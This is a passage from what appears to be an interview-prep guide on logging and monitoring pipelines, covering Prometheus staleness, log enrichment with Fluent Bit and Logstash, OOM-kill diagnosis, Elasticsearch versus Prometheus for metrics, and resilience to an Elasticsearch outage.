Value:   8900     8915     8930     8945     NaN*   (target down, no scrape)
                                              ↑
                                    staleness marker
```

PromQL functions (rate, avg_over_time, etc.) stop at staleness markers. They don't project forward or backward across a stale boundary. This means:
- `rate()` returns no value after T (not extrapolated rate, not 0, but literally no data point)
- The `up` metric changes to 0 immediately when a staleness marker is written
- Alerts based on `up == 0` fire within one scrape interval of the failure (15 seconds)

**Why this matters for alerting:**

Without staleness markers, after a service restart:
1. Service goes down at T=0
2. Service comes back up at T+60s
3. Counter resets from 8945 to 0 (process restarted)
4. Without staleness: `rate()` sees 8945 → 0 and computes a negative rate (counter decrease). Prometheus handles counter reset detection, but it's imprecise without knowing when the reset happened.
5. With staleness: The staleness marker at T clearly separates pre-downtime and post-downtime series. `rate()` is computed independently before and after. The restart is cleanly handled.

**Operational impact:** Configure `--query.lookback-delta=5m` (default). This is how far back Prometheus looks for the last sample when evaluating a query at a given timestamp. If the last sample is older than `lookback-delta`, Prometheus treats the series as stale. This affects dashboard panels that show "no data" vs. "stale value" — `lookback-delta` controls this threshold.

---

### Q8: You need to add a new field to all log events — say, `region: us-east-1` — across 200 microservices. How do you do this without modifying 200 services and without redeploying anything?

**Answer:**

This is an enrichment problem. The field should be added at the collection layer (Fluent Bit or Logstash), not in each service.

**Approach 1: Fluent Bit Kubernetes metadata enrichment**

Fluent Bit's `kubernetes` filter already enriches events with pod metadata from the Kubernetes API. We need to add a custom label/annotation to pods, then instruct Fluent Bit to extract it.

```yaml
# Step 1: Add label to all pods (via Helm chart value or Kustomize patch)
# In pod template:
metadata:
  labels:
    region: us-east-1
    
# Step 2: Fluent Bit config to include this label
[FILTER]
    Name kubernetes
    Match kube.*
    Include_Labels On
    Labels region
# This adds kubernetes.labels.region=us-east-1 to every log event from these pods
```

**Approach 2: Logstash mutate filter**

In the Logstash filter pipeline, add a `mutate` filter:
```
filter {
  if [kubernetes][node_name] =~ /^ip-10-0/ {
    mutate { add_field => { "region" => "us-east-1" } }
  }
  if [kubernetes][node_name] =~ /^ip-10-1/ {
    mutate { add_field => { "region" => "us-west-2" } }
  }
}
```
This is applied centrally — no changes to any microservice. Deployed by updating the Logstash ConfigMap and rolling the Logstash pods (zero-downtime rolling restart).

**Approach 3: Fluent Bit record modifier filter**

```
[FILTER]
    Name record_modifier
    Match *
    Record region us-east-1
    Record cluster production-east
```
This adds static fields to every event globally. For dynamic values (like node region derived from the node name), use the `lua` filter with a Lua script.

**Approach 4: Elasticsearch index template (post-ingestion enrichment)**

Add `region` as a pipeline parameter in an Elasticsearch ingest pipeline:
```json
PUT _ingest/pipeline/add-region
{
  "description": "Add region field",
  "processors": [
    { "set": { "field": "region", "value": "us-east-1" } }
  ]
}
```
Set this as the default pipeline for the index template. Applied at indexing time, no changes needed upstream.

**Which to use?** For purely static metadata (region, cluster, environment), Fluent Bit record_modifier is simplest — one config change, no downstream changes. For conditional or derived values, Logstash mutate is more flexible. For post-hoc enrichment of already-indexed data, Elasticsearch reindex with an ingest pipeline.

**What If:** "What if different nodes are in different regions?" Use the Lua filter in Fluent Bit to extract the region from the node's hostname (which typically encodes the region in cloud environments, e.g., `ip-10-0-1-45.us-east-1.compute.internal`).

---

### Q9: Describe the complete sequence of events from when an application crashes (pod OOM-killed in Kubernetes) to when an SRE has all the information they need to diagnose the root cause.

**Answer:**

**T=0: OOM Kill**

The kernel OOM killer selects the Java process (highest memory usage in the cgroup). It sends `SIGKILL`. The process terminates instantly — no graceful shutdown, no flush of in-memory log buffer. The last N log events in the async logging buffer are lost (this is the cost of async logging).

The container terminates. Kubernetes detects the exit code `137` (128 + 9, where 9 is SIGKILL). The pod status changes to `OOMKilled`.

**T+1s: Container runtime writes final log**

The container runtime detects the container exit. It closes the log file. Any buffered writes to the log file are flushed (by the container runtime, not the application).

**T+2s: Kubernetes restarts the pod**

Kubernetes's restart policy (`Always` by default) triggers. A new container instance starts. The old pod's log file remains at `/var/log/containers/order-service-7d8f9b-xk2p4.log` (Kubernetes keeps the last terminated container's logs until the pod is deleted or the node runs out of disk).

**T+5s: Fluent Bit notices the log file activity, ships remaining events**

Fluent Bit's inotify watch on the container's log file fired when the runtime closed the file. Fluent Bit reads the remaining events up to the close. These are shipped to Kafka. A few events from before the crash make it through. The events lost in the application's async buffer are gone.

**T+15s: Kubernetes events are generated**

Kubernetes generates events:
```
LAST SEEN  TYPE     REASON      OBJECT                          MESSAGE
0s         Warning  OOMKilling  pod/order-service-7d8f9b-xk2p4 Memory limit reached...
```
These events are captured by an event exporter (e.g., kube-event-exporter or Kubernetes event-router) which ships them to Kafka/Logstash as structured log events.

**T+30s: Prometheus scrape captures the restart**

The next Prometheus scrape captures:
```
kube_pod_container_status_restarts_total{pod="order-service-7d8f9b-xk2p4"} 1
kube_pod_container_status_last_terminated_reason{reason="OOMKilled"} 1
container_memory_usage_bytes{container="order-service"} → spike then drop to 0
```

**T+45s: Alert fires**

Prometheus alert rule:
```yaml
- alert: PodOOMKilled
  expr: kube_pod_container_status_last_terminated_reason{reason="OOMKilled"} == 1
  severity: warning
```
This fires. Alertmanager routes to Slack. SRE sees the notification.

**T+2m: SRE begins investigation**

SRE opens the pre-linked Grafana dashboard showing:
1. Memory usage for `order-service` over the last hour → sees a steady climb to the limit (OOM not a spike — a memory leak)
2. Kubernetes events in Kibana → confirms OOMKilled with timestamp
3. Application logs in Kibana → last events before the kill show which request/operation was running
4. Distributed trace → the trace_id from the last log entry links to a Jaeger trace showing the specific request, SQL query, and which third-party API calls were in flight when the OOM happened
5. JVM heap metrics (if a JVM service with JMX exporter) → heap usage broken down by generation, GC pause duration — identifies where the memory is being held

**What the SRE concludes:** The memory leak started 3 hours ago (visible from the steady memory ramp in Grafana). The last 10 log entries before the kill all involve a specific endpoint (`/api/orders/bulk-import`). The trace for that endpoint shows 10,000 order objects loaded into memory in a single request. The fix: paginate the bulk import to avoid loading everything into memory.

**Information completeness:** Without centralized logging and monitoring, the SRE would only know "the pod restarted." With the full pipeline, they have: exact timing, memory growth over time, last known state (from logs), causative request (from traces), and a smoking gun (all OOM events correlate with the bulk-import endpoint).

---

### Q10: What is the tradeoff between using Elasticsearch as your metrics store vs. Prometheus TSDB, and when would you choose each?

**Answer:**

**Prometheus TSDB:**
- Optimized for time-series data: fixed-schema labels, floating-point values, timestamps
- Extremely efficient storage: 1.37 bytes/sample (XOR compression)
- Fast range queries and aggregations via PromQL (compiled to efficient evaluation plans)
- Native support for counters, gauges, histograms (first-class concepts)
- Built-in staleness handling
- Scrape-based collection (pull model, good for dynamic environments)
- **Limitation:** Designed for operational metrics, NOT log data. PromQL cannot do full-text search. Cannot store string values. Cardinality ceiling (~1M series per instance).

**Elasticsearch as metrics store:**
- Can store any JSON document including both structured metric values AND free-text fields
- Full-text search on metric metadata (e.g., search for "payment" in metric names)
- Flexible schema: add new fields without schema migrations
- SQL-like queries (Elasticsearch SQL or Kibana Lens)
- **Limitation:** Far less efficient than TSDB for pure numeric time series (10× more storage, slower aggregations for large time ranges). No native counter/histogram semantics. No staleness handling. Pull scraping not native (push only).

**Decision matrix:**

| Use Case | Prometheus | Elasticsearch |
|---------|-----------|--------------|
| Service latency, error rates | ✓ Ideal | ✗ Inefficient |
| Infrastructure metrics (CPU, mem) | ✓ Ideal | ✗ Inefficient |
| Business metrics (revenue/min) | ✓ Good | ✓ Also OK |
| Correlated log + metric queries | ✗ Cannot do | ✓ Ideal |
| Long-term retention (>1 year) | ✓ With Thanos (S3) | ✓ With ILM (cold tier) |
| Ad-hoc query on metric metadata | ✗ Limited | ✓ Full-text search |
| High-cardinality metrics | ✗ Problematic | ✓ Better |
| Per-user, per-request metrics | ✗ Cardinality issue | ✓ Good |

**When to choose Elasticsearch for metrics:**
- You already have Elasticsearch for logs and want one query interface for both
- You need to correlate a metric value with the log events that caused it (same query, same index)
- Your metrics are high-cardinality (per-user, per-request) — these would OOM Prometheus
- You need full-text search on metric names or values

**When to choose Prometheus:**
- Standard operational metrics (the 99% case)
- You need to compute rates, percentiles, aggregations over time efficiently
- You need alerting with PromQL expressions
- You want the standard Kubernetes monitoring ecosystem (kube-state-metrics, node-exporter)

**Real-world answer:** Use BOTH. Prometheus for operational metrics (latency, errors, saturation), Elasticsearch for logs and business events. Connect them via Grafana (which can query both simultaneously) and trace IDs (which link a Prometheus alert to the Elasticsearch logs that explain it).

---

### Q11: How would you architect the logging pipeline to be resilient to a complete Elasticsearch cluster failure, without losing any log data?

**Answer:**

The key insight: Kafka is the source of truth, not Elasticsearch. Elasticsearch is a derived, queryable view of the data in Kafka. If Elasticsearch fails, the data is safe in Kafka (and in cold storage). The only question is: how do you restore visibility (the ability to search logs) quickly?

**Architecture for resilience:**

```
Fluent Bit → Kafka (durable, replicated across 3 brokers)
                │
                ├── Consumer A: Elasticsearch (primary search index)
                │     [If ES fails, this consumer pauses and accumulates lag]
                │
                ├── Consumer B: S3 cold storage (always running, independent)
                │     [Even if ES fails, all logs are going to S3]
                │
                └── Consumer C: Fallback search (OpenSearch on different infra)
                      [Normally idle; activated during ES outage]
```

**Failover sequence when Elasticsearch fails:**

1. **T=0: Elasticsearch fails.** Consumer A (Logstash → ES) starts receiving connection errors. It backs off and retries.

2. **Kafka preserves events.** Consumer A's committed offset stops advancing. Lag grows at the rate of log production. With 7-day Kafka retention and a 1-hour ES outage, lag reaches ~1/168 of max capacity — well within retention.

3. **SRE activates fallback.** A Terraform module deploys a temporary OpenSearch cluster (or a different Elasticsearch cluster). Takes 10–15 minutes.

4. **Consumer D starts.** A new Logstash consumer with the fallback ES as output is started. But it can only index from the current moment forward, not the backlog.

5. **Backfill from Kafka.** Start a separate Logstash process with `auto.offset.reset=earliest` for the relevant time window. This replays the missed events from Kafka into the fallback ES. With a 10GB/hour log rate and ES indexing at 2GB/minute, a 1-hour outage takes 5 minutes to backfill.

6. **S3 as backup for backfill.** If Kafka retention doesn't cover the full outage (outage > 7 days), the S3 cold storage consumer has complete data. A Spark/EMR job can re-ingest from S3 Parquet files into Elasticsearch. Slower (hours) but possible.

**Operational readiness:**
- Regularly test the failover by intentionally failing ES in a staging environment
- Maintain a "dark" standby ES cluster (same configuration, not receiving data) that can be activated quickly
- Pre-configure Logstash output alternates in a commented-out section of the config — activation is one config change
- Document the RTO (Recovery Time Objective): how quickly can you restore log visibility?
  - With fallback OpenSearch pre-configured: 15 minutes
  - Without: 1–2 hours

**What If:** "What if Kafka also fails at the same time as Elasticsearch?" Now you're dealing with a catastrophic failure. The last resort: Fluent Bit has a disk buffer (if configured with `storage.type filesystem`). Events that Fluent Bit couldn't ship to Kafka are on the node's local disk. They will be shipped once Kafka recovers. For the events lost between Kafka's last disk-sync and the failure: check the container log files on each node — they're the original source. Fluent Bit can be restarted with `DB.Path` pointing to its checkpoint file, and it will re-read from the last successfully shipped position in each container log file.

---

*Document ends. Coverage: complete log pipeline mechanics, Kafka internals, Elasticsearch index design, Prometheus TSDB storage model, Alertmanager routing, 6 detailed attack scenarios (log injection, alert suppression, data exfiltration, log4shell-style DoS, PromQL DoS, SSRF), scaling architecture (Thanos, ES tiers), and 11 deep interview questions with why/what-if variants including GDPR erasure, OOM kill forensics, and resilience design.*
